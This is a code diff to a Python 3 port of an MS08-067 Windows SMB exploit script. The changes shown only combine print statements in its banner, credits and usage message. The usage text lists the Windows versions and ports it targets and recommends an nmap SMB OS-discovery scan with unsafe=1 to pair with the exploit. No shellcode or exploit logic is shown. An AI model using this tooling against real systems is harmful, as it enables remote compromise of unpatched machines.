@@ -11,27 +11,27 @@ try:
     from impacket.dcerpc.v5 import transport
 
 except ImportError:
-    print ('Install the following library to make this script work')
-    print ('Impacket : https://pypi.org/project/impacket/')
-    print ('PyCrypto : https://pypi.org/project/pycrypto/')
+    print ('Install the following library to make this script work\n'
+    'Impacket : https://pypi.org/project/impacket/\n'
+    'PyCrypto : https://pypi.org/project/pycrypto/\n')
     sys.exit(1)
 
-print ('#######################################################################')
-print ('#   MS08-067 Exploit')
-print ('#   This is a modified version of Andy Acer\'s code (https://github.com/andyacer/ms08_067) to make it compatible with Python 3.')
-print ('#   Based on Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
-print ('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
-print ('#')
-print ('#   Mod in 2021 by Yannis Rachdi (aka Nerkho)')
-print ('#   - Modified the script to make it compatible with Python 3')
-print ('#')
-print ('#   Mod in 2018 by Andy Acer:')
-print ('#   - Added support for selecting a target port at the command line.')
-print ('#     It seemed that only 445 was previously supported.')
-print ('#   - Changed library calls to correctly establish a NetBIOS session for SMB transport')
-print ('#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste')
-print ('#     into this source file.')
-print ('#######################################################################\n')
+print ('#######################################################################\n'
+'#   MS08-067 Exploit\n'
+'#   This is a modified version of Andy Acer\'s code (https://github.com/andyacer/ms08_067) to make it compatible with Python 3.\n'
+'#   Based on Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).\n'
+'#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi\n'
+'#\n'
+'#   Mod in 2021 by Yannis Rachdi (aka Nerkho)\n'
+'#   - Modified the script to make it compatible with Python 3\n'
+'#\n'
+'#   Mod in 2018 by Andy Acer:\n'
+'#   - Added support for selecting a target port at the command line.\n'
+'#     It seemed that only 445 was previously supported.\n'
+'#   - Changed library calls to correctly establish a NetBIOS session for SMB transport\n'
+'#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste\n'
+'#     into this source file.\n'
+'#######################################################################\n')
 
 
 # ------------------------------------------------------------------------
@@ -218,18 +218,17 @@ if __name__ == '__main__':
            os = sys.argv[2]
            port = sys.argv[3]
        except IndexError:
-                print ('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
-                print ('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
-                print ('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
-                print ('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
-                print ('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
-                print ('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
-                print ('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
-                print ('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
-                print ('')
-                print ('Also: nmap has a good OS discovery script that pairs well with this exploit:')
-                print ('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
-                print ('')
+                print ('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0] + '\n'
+                'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445\n'
+                'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)\n'
+                'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal\n'
+                'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English\n'
+                'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)\n'
+                'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)\n'
+                'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)\n'
+                '\n'
+                'Also: nmap has a good OS discovery script that pairs well with this exploit:\n'
+                'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1\n')
                 sys.exit(-1)
 
 
